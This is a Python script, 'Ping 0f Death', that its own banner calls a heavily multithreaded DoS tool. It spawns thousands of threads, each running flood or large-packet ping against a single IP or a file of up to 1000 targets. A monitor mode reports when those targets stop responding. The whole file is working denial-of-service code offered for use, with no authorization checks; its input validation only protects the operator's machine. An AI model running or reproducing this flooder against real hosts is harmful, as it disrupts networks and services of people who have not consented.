#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ======================
# Ping 0f Death (PoD.py)
# http://github.com/34zY
# Author : 34zY
# ======================
# HEAVILY multithreaded dos ping tool
import os,sys,threading,subprocess,time,socket,ipaddress,signal,re,pathlib

# Enable ANSI colors on Windows
if os.name == 'nt':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    
# Set UTF-8 encoding for console output
if sys.version_info >= (3, 7):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
else:
    # For older Python versions
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'replace')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'replace')

# wireshark
# python PoD.py -i 127.0.0.1 -t 250
# wireshark --> reset

# type hosts.txt
# python PoD.py -l hosts.txt -t 5
# wireshark


# take n_threads_user fill the array in i range of n_threads_user
# numbers_threadz[i] = i{n_threads_user}
numbers_threadz = []
active_threads = []
verbose = False
running = True
monitor = False
monitor_threads = []
packet_counters = {}  # Track packets sent per IP

# Security constants
MAX_THREADS = 5000  # Hard limit on threads
MAX_TARGETS = 1000  # Maximum number of targets from file
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB max file size
ALLOWED_FILE_EXTENSIONS = ['.txt', '.list', '.conf']

# === Style === #
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
	print(style.BOLD+style.BLACK+'''

            ;....;                           
           ;....; .;                /\          
         ;.....'   .;              / /         
        ;.....;     ;.           /VVV\            
       ,.....'       ;          /VVVVV\         
       ......;       ;         /VVVVVVV\       
       ;.....;       ;         VVVVVVVVV\       
      ,;......;     ;'         / VVVVVVVVV      
    ;.........`. ,,,;.        / /  DVVVVVVV   
  .';.................;,     / /     DVVVVVV   
 ,......;......;;;;....;,   / /        DVVVVV  
;`......`'......;;;..... ,#/ /          DVVVVV
.`.......`;......;;... ;..# /            DVVVVV
..`.......`;........ ;....#/              DVVVV
`.`.......`;...... ;......#                DVVV
 ...`.......`;; ;.........##                VVV
 ....`.......`;........;...#                VVV
 `.....`............;'`.;..#                VV
  `.....`........;' /  / `.#                V  
   ......`.....;'  /  /   `#              
'''+style.RESET+style.RED+'''██▓███   ▒█████  ▓█████▄
▓██░  ██▒▒██▒  ██▒▒██▀ ██▌  ''' + style.RESET + '''| Ping 0f Death '''+style.RED+''' 
▓██░ ██▓▒▒██░  ██▒░██   █▌  ''' + style.RESET + '''| HEAVILY Multithreaded DOS Tool'''+style.RED+'''
▒██▄█▓▒ ▒▒██   ██░░▓█▄   ▌  ''' + style.RESET + '''| Github : http://github.com/34zY'''+style.RED+'''
▒██▒ ░  ░░ ████▓▒░░▒████▓ 
▒▓▒░ ░  ░░ ▒░▒░▒░  ▒▒▓  ▒ 
░▒ ░       ░ ▒ ▒░  ░ ▒  ▒ 
░░   ░   ░ ░ ░ ▒   ░ ░  ░ 
░    ░       ░ ░     ░  ░  
░            ░     ░ ░
                   ░ 
	 ''' + style.RESET)

def help():
	print("""___________________________________________________

Usage: python PoD.py -i <Target IP> -t  <Threads> [-v] [-m]
       python PoD.py -l <IP File>   -t  <Threads> [-v] [-m]
___________________________________________________

Options:
  -i <IP>        Single target IP address
  -l <file>      File containing list of IPs (one per line)
  -t <threads>   Number of threads per target
  -v             Verbose mode (show packets sent count)
  -m             Monitor mode (check target response every 10s)
  -h             Show this help message

Examples:
  python PoD.py -i 192.168.1.1 -t 100 -v -m
  python PoD.py -l targets.txt -t 50 -m

/!\ Don't put too much threads when using the list option
    For each IP there is the number of threads inserted
		"""+style.RESET)

def validate_ip(ip):
	"""Validate IP address format - SECURE"""
	if not ip or not isinstance(ip, str):
		return False
	
	# Remove any whitespace
	ip = ip.strip()
	
	# Length check to prevent buffer overflow attempts
	if len(ip) > 45:  # Max IPv6 length is 45 chars
		return False
	
	# Check for shell metacharacters and special characters
	dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\\', '\n', '\r', '\t', '"', "'", '{', '}']
	for char in dangerous_chars:
		if char in ip:
			return False
	
	try:
		# Use ipaddress module for proper validation
		ip_obj = ipaddress.ip_address(ip)
		
		# Reject reserved/private IPs if needed (optional - currently allowing all)
		# Uncomment to restrict to public IPs only:
		# if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
		#     return False
		
		return True
	except ValueError:
		return False

def validate_thread_count(thread_str):
	"""Validate and sanitize thread count input - SECURE"""
	if not thread_str or not isinstance(thread_str, str):
		return None
	
	# Remove whitespace
	thread_str = thread_str.strip()
	
	# Check for only digits (no negative, no decimals, no special chars)
	if not re.match(r'^\d+$', thread_str):
		return None
	
	try:
		count = int(thread_str)
		
		# Enforce reasonable bounds
		if count <= 0 or count > MAX_THREADS:
			return None
		
		return count
	except (ValueError, OverflowError):
		return None

def validate_file_path(file_path):
	"""Validate file path to prevent path traversal - SECURE"""
	if not file_path or not isinstance(file_path, str):
		return None
	
	# Remove whitespace
	file_path = file_path.strip()
	
	# Length check
	if len(file_path) > 4096:
		return None
	
	# Check for null bytes
	if '\x00' in file_path:
		return None
	
	try:
		# Convert to absolute path and resolve
		path_obj = pathlib.Path(file_path).resolve()
		
		# Check if file exists
		if not path_obj.exists():
			return None
		
		# Check if it's a file (not directory, symlink, etc.)
		if not path_obj.is_file():
			return None
		
		# Check file size
		if path_obj.stat().st_size > MAX_FILE_SIZE:
			print(style.RED + "[!]" + style.RESET + f" File too large (max {MAX_FILE_SIZE} bytes)")
			return None
		
		# Check file extension (optional security measure)
		if path_obj.suffix.lower() not in ALLOWED_FILE_EXTENSIONS:
			print(style.YELLOW + "[!]" + style.RESET + f" Warning: Unusual file extension '{path_obj.suffix}'")
			response = input(style.YELLOW + "[?]" + style.RESET + " Continue? (y/n): ")
			if response.lower() != 'y':
				return None
		
		# Prevent path traversal - ensure file is not in sensitive directories
		sensitive_dirs = ['/etc', '/sys', '/proc', 'C:\\Windows', 'C:\\System32']
		for sensitive_dir in sensitive_dirs:
			try:
				if pathlib.Path(sensitive_dir).exists():
					if pathlib.Path(sensitive_dir).resolve() in path_obj.parents:
						print(style.RED + "[!]" + style.RESET + " Access to sensitive directories is not allowed")
						return None
			except:
				pass
		
		return str(path_obj)
		
	except (OSError, RuntimeError, ValueError) as e:
		verbose_print(f"File validation error: {str(e)}", style.RED)
		return None

def sanitize_ip_list(ip_list):
	"""Sanitize and validate a list of IPs - SECURE"""
	if not isinstance(ip_list, list):
		return []
	
	valid_ips = []
	for ip in ip_list:
		if isinstance(ip, str):
			ip_clean = ip.strip()
			if validate_ip(ip_clean):
				valid_ips.append(ip_clean)
				
				# Limit number of targets
				if len(valid_ips) >= MAX_TARGETS:
					print(style.YELLOW + "[!]" + style.RESET + f" Maximum targets ({MAX_TARGETS}) reached")
					break
	
	return valid_ips

def verbose_print(message, color=style.CYAN):
	"""Print message only in verbose mode"""
	if verbose:
		print(color + "[v]" + style.RESET + " " + message)

def signal_handler(sig, frame):
	"""Handle keyboard interrupt gracefully"""
	global running
	running = False
	print("\n" + style.RED + "[!]" + style.RESET + " Stopping PoD... Please wait for threads to finish.")
	
	# Show final packet count summary
	if packet_counters:
		print("\n" + style.CYAN + "[*] Packet Summary:" + style.RESET)
		for ip, count in packet_counters.items():
			print(f"  {ip}: ~{count} packets sent")
	
	sys.exit(0)

def monitor_target(IP):
	"""Monitor target to check if it's still responding (every 10 seconds) - SECURE"""
	# Validate IP before monitoring
	if not validate_ip(IP):
		print(style.RED + "[!]" + style.RESET + f" Invalid IP for monitoring: {IP}")
		return
	
	verbose_print(f"Monitor thread started for {IP}", style.MAGENTA)
	last_status = None
	
	while running:
		try:
			# Perform a single ping to check if target is responding
			# SECURITY: Use list format, never shell=True
			if os.name == 'nt':
				cmd = ["ping", "-n", "1", "-w", "1000", IP]
			else:
				cmd = ["ping", "-c", "1", "-W", "1", IP]
			
			result = subprocess.run(
				cmd,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				timeout=2,
				shell=False,  # CRITICAL: Never use shell=True
				close_fds=True
			)
			
			is_responding = result.returncode == 0
			
			# Only print when status changes or in verbose mode
			if is_responding != last_status:
				if is_responding:
					print(style.GREEN + "[✓]" + style.RESET + f" Target {IP} is RESPONDING")
				else:
					print(style.RED + "[✗]" + style.RESET + f" Target {IP} is NOT RESPONDING (may be down or blocking ICMP)")
				last_status = is_responding
			elif verbose and is_responding:
				print(style.CYAN + "[✓]" + style.RESET + f" Monitor: {IP} still responding")
			
		except subprocess.TimeoutExpired:
			if last_status != False:
				print(style.RED + "[✗]" + style.RESET + f" Target {IP} TIMEOUT (not responding)")
				last_status = False
		except Exception as e:
			verbose_print(f"Monitor error for {IP}: {str(e)}", style.RED)
		
		# Wait 10 seconds before next check
		for _ in range(100):
			if not running:
				break
			time.sleep(0.1)
	
	verbose_print(f"Monitor thread stopped for {IP}", style.MAGENTA)

def PoD(IP, thread_id):
	"""Execute ping attack - SECURE"""
	try:
		# Final validation before execution
		if not validate_ip(IP):
			print(style.RED + "[!]" + style.RESET + f" Invalid IP rejected: {IP}")
			return
		
		verbose_print(f"Thread {thread_id} started for {IP}", style.CYAN)
		
		# Initialize packet counter for this IP
		if IP not in packet_counters:
			packet_counters[IP] = 0
		
		# Build command as list (NOT string) to prevent injection
		# SECURITY: Never use shell=True, always use list format
		if os.name == 'nt':
			# Windows: ping with -t (infinite) and -l (packet size)
			cmd = ["ping", IP, "-t", "-l", "65500"]
		else:
			# Linux/Unix: ping with flood option if root, else continuous
			cmd = ["ping", "-f", IP]
		
		# Execute with secure subprocess settings
		ping = subprocess.Popen(
			cmd,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL,
			shell=False,  # CRITICAL: Never use shell=True
			close_fds=True  # Close file descriptors for security
		)
		
		# In verbose mode, show packets being sent
		if verbose:
			packet_count = 0
			start_time = time.time()
			while running:
				if ping.poll() is not None:
					break
				
				# Update packet counter (estimate based on time)
				elapsed = time.time() - start_time
				if os.name == 'nt':
					# Windows ping sends ~1 packet per second by default
					estimated_packets = int(elapsed)
				else:
					# Linux flood ping sends many packets per second
					estimated_packets = int(elapsed * 1000)
				
				if estimated_packets > packet_count:
					packet_count = estimated_packets
					packet_counters[IP] += (estimated_packets - packet_count + 1)
					print(style.GREEN + f"[>>]" + style.RESET + f" Thread-{thread_id} sent {packet_count} packets to {IP}")
				
				time.sleep(1)  # Update every second in verbose mode
		else:
			# Keep process running without verbose output
			while running:
				if ping.poll() is not None:
					break
				time.sleep(0.1)
		
		ping.terminate()
		try:
			ping.wait(timeout=2)
		except subprocess.TimeoutExpired:
			ping.kill()
		
		verbose_print(f"Thread {thread_id} stopped for {IP}", style.YELLOW)
		
	except subprocess.SubprocessError as e:
		print(style.RED + "[!]" + style.RESET + f" Subprocess error on {IP}: {str(e)}")
	except Exception as e:
		print(style.RED + "[!]" + style.RESET + f" Error in thread {thread_id}: {str(e)}")

def _3vil_buffer(IP, n_threads_user):
	"""Create and manage threads for attack - SECURE"""
	global active_threads
	
	try:
		# Validate and sanitize thread count
		thread_count = validate_thread_count(str(n_threads_user))
		if thread_count is None:
			print(style.RED + "[!]" + style.RESET + f" Invalid thread count: {n_threads_user}")
			print(style.RED + "[!]" + style.RESET + f" Thread count must be between 1 and {MAX_THREADS}")
			return False
		
		# Validate IP address
		if not validate_ip(IP):
			print(style.RED + "[!]" + style.RESET + f" Invalid IP address: {IP}")
			return False
		
		# Check thread limit with warning
		if thread_count > 1000:
			print(style.YELLOW + "[!]" + style.RESET + f" Warning: Using {thread_count} threads may cause system instability")
			response = input(style.YELLOW + "[?]" + style.RESET + " Continue? (y/n): ")
			if response.lower() != 'y':
				return False
		
		verbose_print(f"Initializing {thread_count} threads for {IP}", style.CYAN)
		
		local_threads = []
		for i in range(thread_count):
			if verbose:
				print(style.GREEN + "[+]" + style.RESET + f" Thread {i+1}/{thread_count} starting...", end="\r")
			
			t = threading.Thread(target=PoD, args=(IP, i), daemon=True, name=f"PoD-{IP}-{i}")
			t.start()
			local_threads.append(t)
			active_threads.append(t)
			time.sleep(0.001)  # Small delay to prevent overwhelming system
		
		print(style.RED + "[+]" + style.RESET + f" Sending ICMP packets with {thread_count} threads to {IP}")
		verbose_print(f"All threads initialized for {IP}", style.GREEN)
		return True
		
	except ValueError:
		print(style.RED + "[!]" + style.RESET + " Invalid number of threads. Must be an integer.")
		return False
	except Exception as e:
		print(style.RED + "[!]" + style.RESET + f" Error initializing threads: {str(e)}")
		return False

def parse_arguments():
	"""Parse and validate command line arguments"""
	global verbose, monitor
	
	if len(sys.argv) < 2:
		return None
	
	# Check for verbose flag
	if '-v' in sys.argv:
		verbose = True
		verbose_print("Verbose mode enabled", style.GREEN)
	
	# Check for monitor flag
	if '-m' in sys.argv:
		monitor = True
		print(style.MAGENTA + "[M]" + style.RESET + " Monitor mode enabled (checking target response every 10s)")
	
	args = {}
	
	try:
		if '-h' in sys.argv:
			args['mode'] = 'help'
		elif '-i' in sys.argv and '-t' in sys.argv:
			i_idx = sys.argv.index('-i')
			t_idx = sys.argv.index('-t')
			args['mode'] = 'single'
			args['ip'] = sys.argv[i_idx + 1]
			args['threads'] = sys.argv[t_idx + 1]
		elif '-l' in sys.argv and '-t' in sys.argv:
			l_idx = sys.argv.index('-l')
			t_idx = sys.argv.index('-t')
			args['mode'] = 'list'
			args['file'] = sys.argv[l_idx + 1]
			args['threads'] = sys.argv[t_idx + 1]
		else:
			args['mode'] = 'invalid'
			
		return args
	except (IndexError, ValueError):
		return {'mode': 'invalid'}

def main():
	"""Main function with enhanced error handling"""
	global running
	
	# Setup signal handler for graceful shutdown
	signal.signal(signal.SIGINT, signal_handler)
	
	args = parse_arguments()
	
	if args is None or args.get('mode') == 'invalid':
		print(style.RED + "[!]" + style.RESET + " Invalid arguments.")
		help()
		return
	
	if args['mode'] == 'help':
		help()
		return
	
	elif args['mode'] == 'single':
		try:
			# Validate and sanitize inputs
			IP = args['ip']
			n_threads_user = args['threads']
			
			# Validate thread count
			thread_count = validate_thread_count(n_threads_user)
			if thread_count is None:
				print(style.RED + "[!]" + style.RESET + " Invalid thread count.")
				print(style.RED + "[!]" + style.RESET + f" Thread count must be between 1 and {MAX_THREADS}")
				return
			
			# Validate IP
			if not validate_ip(IP):
				print(style.RED + "[!]" + style.RESET + f" Invalid IP address: {IP}")
				return
			
			print(style.YELLOW + "[?]" + style.RESET + f" Target: {IP} | Threads: {thread_count}")
			
			if _3vil_buffer(IP, thread_count):
				# Start monitor thread if monitor mode is enabled
				if monitor:
					monitor_thread = threading.Thread(target=monitor_target, args=(IP,), daemon=True, name=f"Monitor-{IP}")
					monitor_thread.start()
					monitor_threads.append(monitor_thread)
				
				print(style.GREEN + "[+]" + style.RESET + " Attack started. Press Ctrl+C to stop.")
				
				# Keep main thread alive
				while running:
					time.sleep(1)
			else:
				print(style.RED + "[!]" + style.RESET + " Failed to start attack.")
				
		except ValueError:
			print(style.RED + "[!]" + style.RESET + " Invalid number of threads.")
		except Exception as e:
			print(style.RED + "[!]" + style.RESET + f" Error: {str(e)}")
	
	elif args['mode'] == 'list':
		try:
			# Validate and sanitize inputs
			f_name = args['file']
			n_threads_user = args['threads']
			
			# Validate thread count
			thread_count = validate_thread_count(n_threads_user)
			if thread_count is None:
				print(style.RED + "[!]" + style.RESET + " Invalid thread count.")
				print(style.RED + "[!]" + style.RESET + f" Thread count must be between 1 and {MAX_THREADS}")
				return
			
			# Validate file path (SECURITY: prevents path traversal)
			valid_path = validate_file_path(f_name)
			if not valid_path:
				print(style.RED + "[!]" + style.RESET + f" Invalid or inaccessible file: {f_name}")
				return
			
			verbose_print(f"Reading targets from {valid_path}", style.CYAN)
			
			try:
				# Read file with size limit (already validated)
				with open(valid_path, 'r', encoding='utf-8', errors='ignore') as f:
					f_content = f.read(MAX_FILE_SIZE)  # Extra safety limit
			except (IOError, OSError) as e:
				print(style.RED + "[!]" + style.RESET + f" Error reading file: {str(e)}")
				return
			
			# Parse IPs (one per line, ignore empty lines and comments)
			ip_list_raw = []
			for line in f_content.split('\n'):
				line = line.strip()
				if line and not line.startswith('#'):
					ip_list_raw.append(line)
			
			# Sanitize and validate all IPs (SECURITY)
			ip_list = sanitize_ip_list(ip_list_raw)
			
			if not ip_list:
				print(style.RED + "[!]" + style.RESET + " No valid IPs found in file.")
				return
			
			if len(ip_list) < len(ip_list_raw):
				print(style.YELLOW + "[!]" + style.RESET + f" {len(ip_list_raw) - len(ip_list)} invalid IPs were skipped")
			
			print(style.YELLOW + "[?]" + style.RESET + f" Found {len(ip_list)} valid target(s) | Threads per target: {thread_count}")
			
			success_count = 0
			for ip in ip_list:
				if not running:
					break
				print(style.YELLOW + "[?]" + style.RESET + f" Targeting {ip}...")
				if _3vil_buffer(ip, thread_count):
					success_count += 1
					
					# Start monitor thread if monitor mode is enabled
					if monitor:
						monitor_thread = threading.Thread(target=monitor_target, args=(ip,), daemon=True, name=f"Monitor-{ip}")
						monitor_thread.start()
						monitor_threads.append(monitor_thread)
					
					time.sleep(0.5)  # Small delay between targets
			
			if success_count > 0:
				print(style.GREEN + "[+]" + style.RESET + f" Attack started on {success_count}/{len(ip_list)} targets. Press Ctrl+C to stop.")
				# Keep main thread alive
				while running:
					time.sleep(1)
			else:
				print(style.RED + "[!]" + style.RESET + " No attacks started.")
				
		except FileNotFoundError:
			print(style.RED + "[!]" + style.RESET + f" File not found: {f_name}")
		except PermissionError:
			print(style.RED + "[!]" + style.RESET + f" Permission denied: {f_name}")
		except ValueError:
			print(style.RED + "[!]" + style.RESET + " Invalid number of threads.")
		except Exception as e:
			print(style.RED + "[!]" + style.RESET + f" Error: {str(e)}")

if __name__ == "__main__":
	banner()
	try:
		main()
	except KeyboardInterrupt:
		print("\n" + style.RED + "[!]" + style.RESET + " PoD terminated by user.")
		sys.exit(0)
	except Exception as e:
		print(style.RED + "[!]" + style.RESET + f" Unexpected error: {str(e)}")
		help()

